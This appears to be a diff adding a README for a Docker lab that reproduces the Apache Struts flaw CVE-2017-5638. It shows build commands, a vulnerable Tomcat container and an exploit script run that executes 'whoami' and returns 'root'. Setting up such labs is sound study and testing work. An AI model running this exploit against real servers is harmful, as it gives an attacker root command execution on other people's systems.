@@ -1,0 +1,38 @@
+#+TITLE: CVE-2017-5638
+Attack container and exploit
+
+* Build container
+  #+begin_src python :results output
+% make build
+  #+end_src
+
+* Run the vulnerable tomcat server
+  #+begin_src python :results output
+% make run
+docker run -d vulnstruts
+8d1de3d1b...
+  #+end_src
+
+* Run the exploit
+
+  First, get the IP address of the vulnerable tomcat server docker container 
+  #+begin_src python :results output
+docker inspect 8d1de3d1b...
+
+"IPAddress": "172.17.0.6",
+  #+end_src
+
+  Then run the exploit against the IP address
+  #+begin_src python :results output
+% make exploit TARGET_IP=<IP address>
+
+python exploitS2-045-cmd.py TARGET_IP:8080 whoami
+[Execute]: whoami
+
+root
+
+  #+end_src
+
+* Tools used
+  - Debian snapshots repository and our tool to build a Debian jessie image on 20170301. The tool to build the image will be released later because it contains author's information.
+  - Parts of the Dockerfile code and exploits are from piesecurity/apache-struts2-CVE-2017-5638
